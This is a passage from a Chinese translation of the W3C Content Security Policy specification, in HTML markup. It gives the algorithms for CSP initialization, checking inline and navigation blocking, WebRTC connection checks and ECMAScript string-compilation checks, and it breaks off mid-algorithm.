            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document④">Document</a></code>
                <var>document</var>，用户代理按以下步骤初始化 <var>document</var> 的 CSP：
            </p>
            <ol>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate⑧">遍历</a> <var>document</var> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container"
                            id="ref-for-concept-document-policy-container">策略容器</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list⑦">CSP 列表</a> 中的每个 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate⑨">遍历</a> <var>policy</var> 中的每个 <var>directive</var>：</p>
                            <ol>
                                <li data-md>
                                    <p>在 <var>document</var> 上执行 <var>directive</var> 的 <a data-link-type="dfn"
                                            href="#directive-initialization"
                                            id="ref-for-directive-initialization">初始化</a> 算法，并断言：返回值为
                                        "<code>Allowed</code>"。</p>
                            </ol>
                    </ol>
            </ol>
            <h4 class="heading settled algorithm" data-algorithm="获取对象的 CSP 列表" data-level="4.2.2"
                id="get-csp-of-object">
                <span class="secno">4.2.2. </span><span class="content"> 获取 <a data-link-type="dfn"
                        href="#global-object-csp-list" id="ref-for-global-object-csp-list①">CSP 列表</a> 对于
                    <var>object</var> </span><a class="self-link" href="#get-csp-of-object"></a>
            </h4>
            <p>为了获取 <var>object</var> 的 <a data-link-type="dfn" href="#global-object-csp-list"
                    id="ref-for-global-object-csp-list②">CSP 列表</a>：</p>
            <ol>
                <li data-md>
                    <p>如果 <var>object</var> 是一个 <code
                            class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑤">Document</a></code>，
                        则返回 <var>object</var> 的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container"
                            id="ref-for-concept-document-policy-container①">策略容器</a>的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list⑧">CSP 列表</a>。</p>
                </li>
                <li data-md>
                    <p>如果 <var>object</var> 是一个 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window②">Window</a></code>
                        或一个 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope①">WorkerGlobalScope</a></code>
                        或一个 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope①">WorkletGlobalScope</a></code>，
                        则返回<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object"
                            id="ref-for-environment-settings-object①">环境设置对象</a>的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-policy-container"
                            id="ref-for-concept-settings-object-policy-container">策略容器</a>的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list⑨">CSP 列表</a>。</p>
                </li>
                <li data-md>
                    <p>返回 null。</p>
                </li>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="元素的内联类型行为是否应被内容安全策略阻止？"
                data-dfn-type="dfn" data-export data-level="4.2.3"
                data-lt="Should element’s inline type behavior be blocked by Content Security Policy?"
                id="should-block-inline">
                <span class="secno">4.2.3. </span><span class="content"> 元素 <var>element</var> 的内联 <var>type</var>
                    行为是否应被内容安全策略阻止？</span><a class="self-link" href="#should-block-inline"
                    id="ref-for-should-block-inline③"></a>
            </h4>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①">Element</a></code>
                <var>element</var>、一个字符串 <var>type</var> 和一个字符串 <var>source</var>，此算法返回 "<code>Allowed</code>"
                如果该元素被允许内联定义某种特定类型的行为（脚本执行、样式应用、事件处理等），否则返回 "<code>Blocked</code>"：
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <var>type</var> 的有效值包括
                "<code>script</code>"、"<code>script attribute</code>"、"<code>style</code>" 和
                "<code>style attribute</code>"。</p>
            <ol class="algorithm">
                <li data-md>
                    <p class="assertion">断言：<var>element</var> 不为 null。</p>
                </li>
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate①⓪">对于</a> <var>element</var> 的 <code
                            class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑥">Document</a></code>
                        的
                        <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object⑨">全局对象</a>的 <a data-link-type="dfn" href="#global-object-csp-list"
                            id="ref-for-global-object-csp-list③">CSP 列表</a>中的每个 <var>policy</var>：
                    </p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate①①">对于</a> <var>policy</var> 的
                                <a data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set⑨">指令集</a>中的每个 <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>directive</var> 的<a data-link-type="dfn" href="#directive-inline-check"
                                            id="ref-for-directive-inline-check">内联检查</a>在对
                                        <var>element</var>、<var>type</var>、
                                        <var>policy</var> 和 <var>source</var> 执行时返回 "<code>Allowed</code>"，
                                        则跳到下一个 <var>directive</var>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>令 <var>directive-name</var> 为在 <var>type</var> 上执行<a
                                            href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a>的结果。</p>
                                </li>
                                <li data-md>
                                    <p>否则，令 <var>violation</var> 为在<a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object"
                                            id="ref-for-current-settings-object">当前设置对象</a>的<a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"
                                            id="ref-for-concept-settings-object-global①">全局对象</a>、<var>policy</var>
                                        和 <var>directive-name</var> 上执行<a href="#create-violation-for-global">§ 2.4.1
                                            为全局对象、策略和指令创建违规对象</a>的结果。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource⑤">资源</a>设置为 "<code>inline</code>"。</p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-element"
                                            id="ref-for-violation-element">元素</a>设置为 <var>element</var>。</p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>directive</var> 的<a data-link-type="dfn" href="#directive-value"
                                            id="ref-for-directive-value⑧">值</a><a data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#list-contain"
                                            id="ref-for-list-contain④">包含</a>表达式 "<a data-link-type="grammar"
                                            href="#grammardef-report-sample"
                                            id="ref-for-grammardef-report-sample①"><code>'report-sample'</code></a>"，
                                        则将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-sample"
                                            id="ref-for-violation-sample②">样本</a>设置为 <var>source</var> 中包含其前 40
                                        个字符的子字符串。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition⑧">处置方式</a>为 "<code>enforce</code>"，则
                                        将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
                </li>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="应内容安全策略阻止类型为导航请求？" data-dfn-type="dfn"
                data-export data-level="4.2.4"
                data-lt="Should navigation request of type be blocked by Content Security Policy?"
                id="should-block-navigation-request">
                <span class="secno">4.2.4. </span><span class="content">类型为 <var>type</var> 的 <var>导航请求</var>
                    是否应被内容安全策略阻止？</span><a class="self-link" href="#should-block-navigation-request"
                    id="ref-for-should-block-navigation-request③"></a>
            </h4>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request①③">请求</a> <var>navigation request</var> 和一个字符串
                <var>type</var>（“<code>form-submission</code>”或“<code>other</code>”），如果活动策略阻止导航，则此算法返回“<code>Blocked</code>”，否则返回“<code>Allowed</code>”：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate①②">遍历</a> <var>导航请求</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                            id="ref-for-concept-request-policy-container⑥">策略容器</a>的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list①⓪">CSP 列表</a>中的每个 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate①③">遍历</a> <var>policy</var> 中的每个 <var>directive</var>：</p>
                            <ol>
                                <li data-md>
                                    <p>如果在 <var>导航请求</var>、<var>type</var> 和 <var>policy</var> 上执行 <var>directive</var>
                                        的 <a data-link-type="dfn" href="#directive-pre-navigation-check"
                                            id="ref-for-directive-pre-navigation-check">预导航检查</a> 返回
                                        "<code>Allowed</code>"，跳到下一个 <var>directive</var>。</p>
                                <li data-md>
                                    <p>否则，令 <var>violation</var> 为在 <var>导航请求</var> 的 <a data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-client"
                                            id="ref-for-concept-request-client②">客户端</a> 的 <a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"
                                            id="ref-for-concept-settings-object-global②">全局对象</a>、<var>policy</var> 和
                                        <var>directive</var> 的 <a data-link-type="dfn" href="#directive-name"
                                            id="ref-for-directive-name③">名称</a> 上执行 <a
                                            href="#create-violation-for-global">§ 2.4.1 创建全局、策略和指令的违规对象</a> 的结果。
                                    </p>
                                <li data-md>
                                    <p>将 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource⑥">资源</a> 设置为 <var>导航请求</var> 的 <a
                                            data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-url"
                                            id="ref-for-concept-request-url②">URL</a>。</p>
                                <li data-md>
                                    <p>执行 <a href="#report-violation">§ 5.5 报告违规</a> 于 <var>violation</var>。</p>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition⑨">处置</a> 为 "<code>enforce</code>"，则将
                                        <var>result</var> 设置为 "<code>Blocked</code>"。
                                    </p>
                            </ol>
                    </ol>
                <li data-md>
                    <p>如果 <var>result</var> 为 "<code>Allowed</code>"，并且 <var>导航请求</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-current-url"
                            id="ref-for-concept-request-current-url①">当前 URL</a> 的 <a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url-scheme"
                            id="ref-for-concept-url-scheme">方案</a> 为 <code>javascript</code>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate①④">对于</a> <var>navigation
                                    request</var> 的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                                    id="ref-for-concept-request-policy-container⑦">策略容器</a>的<a data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                                    id="ref-for-policy-container-csp-list①①">CSP 列表</a>中的每个 <var>policy</var>：</p>
                            <ol>
                                <li data-md>
                                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                            id="ref-for-list-iterate①⑤">对于</a> <var>policy</var> 中的每个
                                        <var>directive</var>：
                                    </p>
                                    <ol>
                                        <li data-md>
                                            <p>令 <var>directive-name</var> 为在 "<code>navigation</code>" 上执行<a
                                                    href="#effective-directive-for-inline-check">§ 6.8.2
                                                    获取内联检查的有效指令</a>的结果。</p>
                                        </li>
                                        <li data-md>
                                            <p>如果 <var>directive</var> 的<a data-link-type="dfn"
                                                    href="#directive-inline-check"
                                                    id="ref-for-directive-inline-check①">内联检查</a>在对
                                                null、“<code>navigation</code>”和 <var>navigation request</var> 的<a
                                                    data-link-type="dfn"
                                                    href="https://fetch.spec.whatwg.org/#concept-request-current-url"
                                                    id="ref-for-concept-request-current-url②">当前 URL</a>
                                                执行时返回“<code>Allowed</code>”，则跳到下一个 <var>directive</var>。</p>
                                        </li>
                                        <li data-md>
                                            <p>否则，令 <var>violation</var> 为在 <var>navigation
                                                    request</var> 的<a data-link-type="dfn"
                                                    href="https://fetch.spec.whatwg.org/#concept-request-client"
                                                    id="ref-for-concept-request-client③">客户端</a>的<a data-link-type="dfn"
                                                    href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"
                                                    id="ref-for-concept-settings-object-global③">全局对象</a>、<var>policy</var>
                                                和 <var>directive-name</var> 上执行<a href="#create-violation-for-global">§
                                                    2.4.1 为全局对象、策略和指令创建违规对象</a>的结果。
                                            </p>
                                        </li>
                                        <li data-md>
                                            <p>将 <var>violation</var> 的<a data-link-type="dfn"
                                                    href="#violation-resource"
                                                    id="ref-for-violation-resource⑦">资源</a>设置为 "<code>inline</code>"。
                                            </p>
                                        </li>
                                        <li data-md>
                                            <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                            </p>
                                        </li>
                                        <li data-md>
                                            <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                                    id="ref-for-policy-disposition①⓪">处置方式</a>为 "<code>enforce</code>"，则
                                                将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                                        </li>
                                    </ol>
                                </li>
                            </ol>
                    </ol>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="应内容安全策略阻止导航请求中的目标导航响应？"
                data-dfn-type="dfn" data-export data-level="4.2.5"
                data-lt="Should navigation response to navigation request of type in target be blocked by Content Security Policy?"
                id="should-block-navigation-response">
                <span class="secno">4.2.5. </span><span class="content">是否应内容安全策略阻止 <var>target</var> 中 <var>navigation
                        request</var> 的 <var>type</var> 导航响应 <var>navigation response</var>？</span><a class="self-link"
                    href="#should-block-navigation-response" id="ref-for-should-block-navigation-response②"></a>
            </h4>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request①④">请求</a> <var>navigation request</var>，一个<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response⑨">响应</a>
                <var>navigation
                    response</var>，一个<a data-link-type="dfn" href="#csp-list" id="ref-for-csp-list①">CSP 列表</a>
                <var>response CSP list</var>，一个字符串
                <var>type</var>（“<code>form-submission</code>”或“<code>other</code>”），以及一个<a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/#navigable" id="ref-for-navigable①">可导航对象</a>
                <var>target</var>，如果活动策略阻止导航，则此算法返回“<code>Blocked</code>”，否则返回“<code>Allowed</code>”：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate①⑥">对于</a> <var>response CSP list</var> 中的每个 <var>policy</var>：
                    </p>
                    <p class="note" role="note"><span class="marker">注意：</span>某些指令（如 <a data-link-type="dfn"
                            href="#frame-ancestors" id="ref-for-frame-ancestors">frame-ancestors</a>）允许<var>响应</var>的<a
                            data-link-type="dfn" href="#content-security-policy"
                            id="ref-for-content-security-policy">内容安全策略</a>作用于导航。
                    </p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate①⑦">对于</a> <var>policy</var> 中的每个 <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>directive</var> 的<a data-link-type="dfn"
                                            href="#directive-navigation-response-check"
                                            id="ref-for-directive-navigation-response-check">导航响应检查</a>在对
                                        <var>navigation
                                            request</var>、<var>type</var>、<var>navigation response</var>、
                                        <var>target</var>、“<code>response</code>”和 <var>policy</var>
                                        执行时返回“<code>Allowed</code>”，则跳到下一个 <var>directive</var>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>否则，令 <var>violation</var> 为在 null、<var>policy</var> 和
                                        <var>directive</var> 的<a data-link-type="dfn" href="#directive-name"
                                            id="ref-for-directive-name④">名称</a>上执行<a
                                            href="#create-violation-for-global">§ 2.4.1 为全局对象、策略和指令创建违规对象</a>的结果。
                                    </p>
                                    <p class="note" role="note"><span class="marker">注意：</span>我们对全局对象使用 null，因为不存在全局对象：
                                        我们尚未处理导航以创建文档。</p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource⑧">资源</a>设置为 <var>navigation
                                            response</var> 的<a data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-response-url"
                                            id="ref-for-concept-response-url①">URL</a>。</p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①①">处置方式</a>为 "<code>enforce</code>"，则
                                        将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate①⑧">对于</a> <var>navigation
                            request</var> 的<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-policy-container"
                            id="ref-for-concept-request-policy-container⑧">策略容器</a>的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list"
                            id="ref-for-policy-container-csp-list①②">CSP 列表</a>中的每个 <var>policy</var>：</p>
                    <p class="note" role="note"><span class="marker">注意：</span><var>navigation
                            request</var> 上下文中的某些指令（如 <a data-link-type="dfn" href="#frame-ancestors"
                            id="ref-for-frame-ancestors①">frame-ancestors</a>）
                        需要在对导航采取行动之前获取<var>响应</var>。</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate①⑨">对于</a> <var>policy</var> 中的每个 <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>directive</var> 的<a data-link-type="dfn"
                                            href="#directive-navigation-response-check"
                                            id="ref-for-directive-navigation-response-check①">导航响应检查</a>在对
                                        <var>navigation
                                            request</var>、<var>type</var>、<var>navigation response</var>、
                                        <var>target</var>、“<code>source</code>”和 <var>policy</var>
                                        执行时返回“<code>Allowed</code>”，则跳到下一个 <var>directive</var>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>否则，令 <var>violation</var> 为在 <var>navigation request</var> 的<a
                                            data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-client"
                                            id="ref-for-concept-request-client④">客户端</a>的<a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"
                                            id="ref-for-concept-settings-object-global④">全局对象</a>、
                                        <var>policy</var> 和 <var>directive</var> 的<a data-link-type="dfn"
                                            href="#directive-name" id="ref-for-directive-name⑤">名称</a>上执行<a
                                            href="#create-violation-for-global">§ 2.4.1 为全局对象、策略和指令创建违规对象</a>的结果。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource⑨">资源</a>设置为 <var>navigation
                                            request</var> 的<a data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-url"
                                            id="ref-for-concept-request-url③">URL</a>。</p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①②">处置方式</a>为 "<code>enforce</code>"，则
                                        将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
                </li>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="运行全局对象的CSP初始化" data-dfn-type="dfn"
                data-export data-level="4.2.6" data-lt="Run CSP initialization for a global object"
                id="run-global-object-csp-initialization">
                <span class="secno">4.2.6. </span><span class="content">运行 <code>CSP</code> 初始化以处理全局对象</span><a
                    class="self-link" href="#run-global-object-csp-initialization"
                    id="ref-for-run-global-object-csp-initialization②"></a>
            </h4>
            <p>给定一个 <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object①⓪">全局对象</a> <var>global</var>，用户代理按以下步骤初始化 <var>global</var> 的 CSP。如果
                <var>global</var> 允许，则此算法返回 "<code>Allowed</code>"，否则返回 "<code>Blocked</code>"：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②⓪">对于</a> <var>global</var> 的<a data-link-type="dfn"
                            href="#global-object-csp-list" id="ref-for-global-object-csp-list④">CSP
                            列表</a>中的每个 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate②①">对于</a> <var>policy</var> 中的每个 <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>在 <var>global</var> 上执行 <var>directive</var> 的<a data-link-type="dfn"
                                            href="#directive-initialization"
                                            id="ref-for-directive-initialization①">初始化</a>算法。如果其返回值为
                                        "<code>Blocked</code>"，则将 <var>result</var> 设置为
                                        "<code>Blocked</code>"。
                                    </p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
                </li>
            </ol>
            <h3 class="heading settled" data-level="4.3" id="webrtc-integration"><span class="secno">4.3. </span><span
                    class="content">与 WebRTC 的集成</span><a class="self-link" href="#webrtc-integration"></a></h3>
            <p><a data-link-type="dfn" href="https://www.w3.org/TR/webrtc/#dfn-administratively-prohibited"
                    id="ref-for-dfn-administratively-prohibited">管理禁止</a> 算法在调用时会调用 <a
                    href="#should-block-rtc-connection">§ 4.3.1 全局对象的RTC连接是否应被阻止？</a>，如果返回
                "<code>Blocked</code>"，则禁止所有候选者。</p>
            <h4 class="heading settled" data-level="4.3.1" id="should-block-rtc-connection"><span class="secno">4.3.1.
                </span><span class="content">全局对象的 <var>global</var> RTC 连接是否应被阻止？</span><a class="self-link"
                    href="#should-block-rtc-connection"></a></h4>
            <p>给定一个<a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object①①">全局对象</a> <var>global</var>，如果 <var>global</var> 的活动策略阻止 RTC 连接，则此算法返回
                "<code>Blocked</code>"，否则返回 "<code>Allowed</code>"：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②②">对于</a> <var>global</var> 的<a data-link-type="dfn"
                            href="#global-object-csp-list" id="ref-for-global-object-csp-list⑤">CSP
                            列表</a>中的每个 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                    id="ref-for-list-iterate②③">对于</a> <var>policy</var> 中的每个 <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>directive</var> 的<a data-link-type="dfn"
                                            href="#directive-webrtc-pre-connect-check"
                                            id="ref-for-directive-webrtc-pre-connect-check">webrtc 预连接检查</a>返回
                                        "<code>Allowed</code>"，则<a data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#iteration-continue"
                                            id="ref-for-iteration-continue②">继续</a>。</p>
                                </li>
                                <li data-md>
                                    <p>否则，令 <var>violation</var> 为在 <var>global</var>、<var>policy</var> 和
                                        <var>directive</var> 的<a data-link-type="dfn" href="#directive-name"
                                            id="ref-for-directive-name⑥">名称</a>上执行<a
                                            href="#create-violation-for-global">§ 2.4.1 为全局对象、策略和指令创建违规对象</a>的结果。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource①⓪">资源</a>设置为 null。</p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①③">处置方式</a>为 "<code>enforce</code>"，则
                                        将 <var>result</var> 设置为 "<code>Blocked</code>"。</p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>返回 <var>result</var>。</p>
                </li>
            </ol>
            <h3 class="heading settled" data-level="4.4" id="ecma-integration"><span class="secno">4.4. </span><span
                    class="content">与 ECMAScript 的集成</span><a class="self-link" href="#ecma-integration"></a></h3>
            <p>ECMAScript 定义了一个 <code
                    class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-hostensurecancompilestrings" id="ref-for-sec-hostensurecancompilestrings">HostEnsureCanCompileStrings()</a></code>
                抽象操作，该操作允许主机环境阻止将字符串编译为 ECMAScript 代码。本文档定义了该抽象操作的实现，该实现会检查相关的 <a data-link-type="dfn"
                    href="#global-object-csp-list" id="ref-for-global-object-csp-list⑥">CSP 列表</a>，以确定是否应该阻止此类编译。</p>
            <h4 class="heading settled dfn-paneled algorithm"
                data-algorithm="EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)"
                data-dfn-type="dfn" data-export data-level="4.4.1"
                data-lt="EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)"
                id="can-compile-strings">
                <span class="secno">4.4.1. </span><span class="content">
                    EnsureCSPDoesNotBlockStringCompilation(<var>realm</var>, <var>parameterStrings</var>,
                    <var>bodyString</var>, <var>codeString</var>, <var>compilationType</var>, <var>parameterArgs</var>,
                    <var>bodyArg</var>) </span><a class="self-link" href="#can-compile-strings"
                    id="ref-for-can-compile-strings"></a>
            </h4>
            <p>给定一个 <a data-link-type="dfn" href="https://tc39.github.io/ecma262#realm" id="ref-for-realm">realm</a>
                <var>realm</var>，一个字符串列表 <var>parameterStrings</var>，一个字符串 <var>bodyString</var>，一个字符串
                <var>codeString</var>，一个枚举 (<var>compilationType</var>)，一个 ECMAScript 语言值列表
                (<var>parameterArgs</var>)，和一个 ECMAScript 语言值 (<var>bodyArg</var>)，如果允许字符串编译，则此算法正常返回，否则抛出
                "<code>EvalError</code>"：
            </p>
            <ol>
                <li data-md>
                    <p>如果 <var>compilationType</var> 为 "<code>TIMER</code>"，则：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>sourceString</var> 为 <var>codeString</var>。</p>
                    </ol>
                <li data-md>
                    <p>否则：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>compilationType</var> 为 "<code>FUNCTION</code>"，则令 <var>compilationSink</var> 为
                                "Function"，否则为 "eval"。</p>
                        <li data-md>
                            <p>令 <var>isTrusted</var> 为 <code>true</code>，如果 <var>bodyArg</var> <a data-link-type="dfn"
                                    href="https://webidl.spec.whatwg.org/#implements" id="ref-for-implements">实现</a>
                                <code
                                    class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/trusted-types/#trustedscript" id="ref-for-trustedscript">TrustedScript</a></code>，否则为
                                <code>false</code>。
                            </p>
                        <li data-md>
                            <p>如果 <var>isTrusted</var> 为 <code>true</code>，则：</p>
                            <ol>
                                <li data-md>
